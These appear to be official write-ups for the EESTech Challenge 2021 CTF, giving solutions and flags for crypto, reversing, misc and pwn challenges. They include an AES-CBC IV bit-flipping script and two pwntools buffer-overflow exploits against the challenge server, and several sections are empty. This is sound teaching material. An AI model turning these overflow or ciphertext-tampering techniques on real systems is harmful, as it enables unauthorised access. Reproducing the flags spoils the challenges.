# EESTech Challenge 2021 Official Write-ups
We helped EESTech and Mesa to organize and manage the CTF, and here you can find all the writeups of the challenges.

Done by: 
* [Gregorio Galletti](https://github.com/gregalletti)
* [Stefano Bagarin](https://github.com/stepolimi)

# Write Ups - Categories and Points
## Web
### Secret code
### Old website
### Note viewer
### Bad redirects

## Cryptography
### Once upon a time 1
Very trivial challenge. wcrx_{kl_hlfhlv_Silkvwfitzex_dv} is clearly "encoded" with Caesar algorithm, so just decrypt it in some way.
**flag_{tu_quoque_Bruteforcing_me}**

### Once upon a time 2
Again another trivial challenge, the main issue was to get the used algorithm. An easy answer is Vigenerè, which is easily bruteforceable, but some online tools would mess this up. A huge hint was given in the challenge description, saying "remember that in cryptography patience is key".

With no surprise, decrypting with key = PATIENCE gives the flag: **flag_{this_was_too_easy_to_decrypt!}**

### Hashception
The challenge starts with a file containing bunch of alphanumerical strings, and 4 strings that were the first 4 strings in the file; the challenge name also states "Blake" which could refer to an hashing algorithm, interesting.

The strings length is repeated in a cyclic way, so:
* 1st string: 128 chars
* 2nd string: 40 chars
* 3rd string: 64 chars
* 4th string: 64 chars
* and then repeated  

We can try to bruteforce one of the first 4 strings (*da39a3ee5e6b4b0d3255bfef95601890afd80709*), resulting in an empty string hashed with SHA1. Ok so maybe also the other 3 correspond to an empty string? 
The answer is yes, and by simply trying I we can pull out also the other used algorithms, reaching this situation:
* 1st string: Blake 2b Hash
* 2nd string: SHA1
* 3rd string: SHA256
* 4th string: SHA3-256

From now on it's pretty easy: we know the algorithms and that we have to always add only a new character.

Here is the final script, that simply gets all the strings and starts from the 5th one. In a cyclic way it bruteforces char by char the 4 different hash types until the end: 
```python
import hashlib
alphabet = " 1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHILMNOPQRSTUVWXYZ,.-_'?!$%&/()={}"
message = ""

file1 = open('hash.txt', 'r')
Lines = file1.readlines()

count = 0;

for line in Lines:
	if(count >3):
		for c in alphabet:
			encMes = ""
			if(count % 4 == 0):
				encMes = hashlib.blake2b(str.encode(message +c)).hexdigest()
			elif(count % 4 == 1):
				encMes = hashlib.sha1(str.encode(message +c)).hexdigest()
			elif(count % 4 == 2):
				encMes = hashlib.sha256(str.encode(message +c)).hexdigest()
			elif(count % 4 == 3):
				encMes = hashlib.sha3_256(str.encode(message +c)).hexdigest()
			if(encMes in line):
				message += c
				break
	count +=1

print(message)
```
Flag: 

**flag_{1t3r4t1v3_h4sh_cr4ck1ng_1s_qu1t3_c00l_w1th_pyth0n}**

### Not a noob
The important thing of this challenge was to have an idea of RC4 algorithm. RC4 is basically a XORing algorithm, and the only way to get the flag here was to suppose that the keys used were identical (as they were): this could be extracted by the fact that we told you "there is no need to bruteforce the key".

Given this, the remaining part is to XOR the two images without XORing their headers. A bitwise XOR on images is performed with this fancy command (Unix systems):
```
convert noob_1.png noob_2.png -fx "(((255*u)&(255*(1-v)))|((255*(1-u))&(255*v)))/255" noob_out.png
```
Resulting in noob_out.png containing: **D0n7_reU2e_J00R_Key2**

### Bank fraud
This wasn't a trivial challenge, however the things you had to focus on were:
* the plaintext length
* the block size

What we have is the original ptx (SEND BOB 100$, length = 13) and its ctx (4c60fc0a8fdf3baa185c885195be64b5 2462320459dbd69ea4383c139c19999e, size1 = 16, size2 = 16). Every AES block in CBC is thus of 16 byte size. 

The modified ptx should become (SEND LEO 999999$, length = 16), so we are good, staying in a single block.

Briefly, AES-CBC works on fixed-size blocks (we said 16 bytes), and the ciphertext of the previous block is used to generate the next one, starting from an Initialization Vector IV. Knowing that, we can conclude that the given ctx is formed by IV and CTX_1 (remember, we use only 1 block).

The CTX_N-1 is used to generate the plaintext of the next block; this is where the **bit/byte flipping attack** smashes. If we change one byte of the CTX_-N-1 then, by XORing with the next decrypted block, we will get a different plaintext! (we can say IV = CTX_0).

In this case we have to modify the IV!

Let's get a general idea: 

```
PTX1 = SEND BOB 100$ 		= 	53 45 4e 44 20 42 4f 42 20 31 30 30 24 00 00 00
PTX2 = SEND LEO 999999$ 	=	53 45 4e 44 20 4c 45 4f 20 39 39 39 39 39 39 24
IV_original			=	4c 60 fc 0a 8f df 3b aa 18 5c 88 51 95 be 64 b5 
CTX 				= 	24 62 32 04 59 db d6 9e a4 38 3c 13 9c 19 99 9e

In formulas we get:
dec(CTX) ^ IV_original = PTX

Take the 6th byte as an example (corresponding to the PTX character 'B'):
dec(db) ^ df = 42

So:
42 ^ 07 = dec(db) = 9d

We now ask ourselves, what is the number that, XORed with 9d, gives us 4c (the new char that we want, so 'L')?
x ^ 9d = 4c	=>	4c ^ 9d = d1
```

**d1** is in fact the 6th byte of the new IV to provide as a flag. 
Let's put it as a general formula: 
```
IV2[i] = ptx2[i] ^ (IV1[i] ^ ptx1[i])
so:
IV2[5] = 4c	 ^ (IV1[5] ^ 42)
IV2[6] = 45	 ^ (IV1[6] ^ 4f)	
```

This can be written in Python, here you can find two different scripts:

```python
-------------
| SCRIPT 1  | (inputs are different)
-------------

iv = [0x49,0x86,0xc2,0x88,0x7a,0x1d,0xfd,0xed,0xea,0xfd,0xab,0x18,0x93,0x8c,0x00,0x19]
ctx = '4c691cb28b4d399bea66f6fa9caae243'

ptx1 = [0x53,0x45,0x4e,0x44,0x20,0x42,0x4f,0x42,0x20,0x31,0x30,0x30,0x24,0x00,0x00,0x00]
ptx2 = [0x53,0x45,0x4e,0x44,0x20,0x4c,0x45,0x4f,0x20,0x39,0x39,0x39,0x39,0x39,0x39,0x24]

res=''
for i in range(0,5):
    res += hex(iv[i])[-2:]

for i in range(5,len(iv)):
    res += (hex(ptx2[i] ^ (iv[i] ^ ptx1[i]))[-2:])
    
print(res + ' ' + ctx)

-------------
| SCRIPT 2  |
-------------

def stringToHexNum(n):
    return int(n, 16)
    
iv2 = '4c60fc0a8fdf3baa185c885195be64b5'
ctx = '2462320459dbd69ea4383c139c19999e'
iv = []
ptx1 = []
ptx2 = []

a = 'SEND BOB 100$'
b = 'SEND LEO 999999$'

for i in range(0,len(iv2),2):
    iv.append(iv2[i] + iv2[i+1])

for i in range(0,len(a)):
    ptx1.append(format(ord(a[i]), "x"))

for i in range(len(a),16):
    ptx1.append('00')

for i in range(0,len(b)):
    ptx2.append(format(ord(b[i]), "x"))

res=''
for i in range(0,5):
    res += iv[i]

for i in range(5,len(iv)):
    x = stringToHexNum(ptx2[i])
    y = stringToHexNum(iv[i])
    z = stringToHexNum(ptx1[i])
    res += hex(x ^ (y ^ z))[-2:]
    
print(res + ' ' + ctx)

```
## Forensics
### Succulent
### Little riddle
### Little haystack
```python

```
### Big haystack
```python

```
### Blackhole
### German espionage

## Miscellaneous
### Trust me
### Papernote
```python

```
### Throwback
The main issue with this challenge is that the given string highly reminds base4 numbers, but that was the point. We also released an hint about that, so you could get the real language used (Morse code). Morse code is actually a quaternary code, with 4 main characters: 
* Line
* Point
* Space
* Newline

So now the challenge is how to replace numbers (0, 1, 2, 3) with these new chars? Well, trial and error is always a good way (helped by the fact that Line and Point should be the ones more frequent, so 1 and 0).

```python
encoded = "0000202010020100211123212000020020002320020002320123211200200021010202010020100201210202111200120002320210012012112011020100202010101232120000202320010201002012110232002000232011212111002110200012001021102000002110120002001021012101020121201021100112321011211120012320000201200012023212111232002102000202010212321200002023210102001201020100210112321000201020121010202000232012102100232120000202320012102100202010200021010211120102023210102000020120102012101021202010232101121112001201020002020100200102010101"
decoded = encoded.replace("0", ".")
decoded = decoded.replace("1", "-")
decoded = decoded.replace("2", " ")
decoded = decoded.replace("3", "\n")

print(decoded)
```
Resulting in:
```
 .... . .-.. .-.. --- 
 - .... .. ... 
 .. ... 
 .- 
 -- .. ... -.-. . .-.. .-.. .- -. . --- ..- ... 
 . -..- .- -- .--. .-.. . .-.-.- 
 - .... . 
 ..-. .-.. .- --. 
 .. ... 
 .-- - ---.. --. ...- ..-. --. ..... --.- ... ..-. -.- -.-. .- - .-. --..-- 
 -.-- --- ..- 
 .... .- ...- . 
 - --- 
 .. -. ... . .-. - 
 - .... . 
 -.-. ..- .-. .-.. -.-- 
 -... .-. .- -.-. . ... 
 .- -. -.. 
 - .... . 
 ..- -. -.. . .-. ... -.-. --- .-. . 
 -.-. .... .- .-. .- -.-. - . .-. 
 -.-- --- ..- .-. ... . .-.. ..-. .-.-.-
```
This is clearly Morse code, so let's just convert it into text (a lot of online tools are available), resulting in:

```hello?this?is?a?miscellaneous?example??the?flag?is?wt8gvfg5qsfkcatr??you?have?to?insert?the?curly?braces?and?the?underscore?character?yourself?```

Ok, so the flag is **flag_{wt8gvfg5qsfkcatr}**

### EESTudios
We are given 2 audio tracks, one "Studio" version and one "Official" version: this already was an hint, due to the fact that having 2 tracks and knowning there is a watermark (or a sort of copyright) we can conclude that we should do some operations between them. To solve it we can open the two tracks with ```Audacity``` to see if just the spectrum of the leaked track contains, for example, an image with the flag (common thing with audio steganography challenges). 

This was right, but we just wanted to fool you ("Nice try! This is not the flag" is displayed). A watermarked audio theoretically contains more than the non-watermarked one, so invert the second one (```Effects > Invert > Built-in-Effect: Invert```) and mix them (```Tracks > Mix > Mix and Render```): the result is, as expected, the actual watermark. By listening it, this is the spelling of the flag.

Here is the flag: 

**flag_{you_did_it}**

## Reversing
### Homemade Encryption
The given code is:
```python
import binascii
key = "graAhogG"
def mystery(s):
    r = ""
    for i, c in enumerate(s):
        r += chr(ord(c) ^ ((i * ord(key[i % len(key)])) % 256))
    return binascii.hexlify(bytes(r, "utf-8"))
```
Seems cool right? Well yes, but actually no. 
What happens with every pure XORing encrypting algorithm? That if the key is known, we can just apply again the encription to decrypt the cyphertext! 
In this case we know the key (graAhogG), so given the ctx as input we can trivially invert everything like this:

```python
import binascii
key = "graAhogG"
flag= "661ec2a3c2a4c3bf5009c2995970c295c2a9c299c3bcc3814111c3a0c28dc2ab4f69c2a7"
def mystery(s):
    r = ""
    t = binascii.unhexlify(s).decode("utf-8")
    for i, c in enumerate(t):
        r += chr(ord(c) ^ ((i * ord(key[i % len(key)])) % 256))
    return bytes(r, "utf-8")

print(mystery(flag))
```

### Password Here Please
The challenge consinsted in reverse engineering a ```Python``` code to find the string that gets throught each check. The first step was just understanding that the problem could be divided in 4 parts.

The first part (lines 5-7) was just a check on the lenght of the string that must be 24 characters. 

The second part (lines 9-14) was a constrain con the first 8 characters of the string: theyr hexadecimal ASCII value being subtracted to 0x98 and concatenated togheter had to be equal to the string '&e"3&Ew*'.
	Resulting string = "r3verS!n"

The third part (lines 16-23) was checking the second set of 8 characters of the string. The last one's ASCII value added to the last character of the array "ring" and to 0x1f gave the last character of the string; each other one was it's following character's ASCII value plus the corresponding number in the "ring" array plus 0x1f if grather than 0x60-0x1e, minus 0x1f if between 0x40-0x1e and 0x60-0x1d, unchanged otherwise.
	Resulting string = "g_pyTh0n"

The fourth part (lines 25-31) was for the last 8 characters and it was the most challenging one. I tryed to convert "code" from hexadecimal to decimal value and then put it in base 257, the result was a nice "number":

[8, 0, 0, 0, 128, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 16, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 4, 0, 0, 0, 0, 0, 0, 0, 0, 32, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

after noticing that each number is a power of 2 I managed to realize that the distance from each non-zero number to the start of the number added to 0x28 was the ASCII value of the characters of the substring, while the exponent of 2 was the index of the character in the substring (0-7).
Once understood that, there was only left to find each value and reorder them.
	Resulting string= "_fOr_FUn"

The result was the 3 substrings togheter.

**r3verS!ng_pyTh0n_fOr_FUn**

### Emotet is between us

## Pwn
### Binary1.0
This challenge is very trivial. Our goal is to bypass the if statement and execute the system function. to bypass the boolean controll we must modify the "isAuthenicated" variable from 0 to any other value, in simple terms we must overflow the buffer (48 bytes) with a payload of 48+8 bytes long; in this way we overwrite the content of "isAuthenticated" variable and wether the last eight bytes of the payload are different from zero we have bypassed the if statement and we get the flag.

Written in Python this is:
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
r = remote("host1.metaproblems.com", 5150)

payload = b"a" * 62

r.send(payload)

r.interactive()
```

**MetaCTF{just_a_little_auth_bypass}**

### Binary2.0
This challenge is quite similar to the previus one. We always have to do a buffer owerflow in this way: to bypass the string comparison our buffer must start with "Sup3rs3cr3tC0de" string and it must overwrite RIP with the address of the win function. The below script is auto-esplicative.
```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
r = remote("host1.metaproblems.com", 5151)

# from a quick run with gdb
addr = 0x401172 
base = 0xd68
payload = b"Sup3rs3cr3tC0de" + b"\x00" * 33 + p64(base) + p64(addr)

r.send(payload)

r.interactive()
```

**MetaCTF{c_strings_are_the_best_strings}**

### Godlike
```python
codice
```
**MetaCTF{i_W0N_w!thOUt_CHEat!nG!!}**
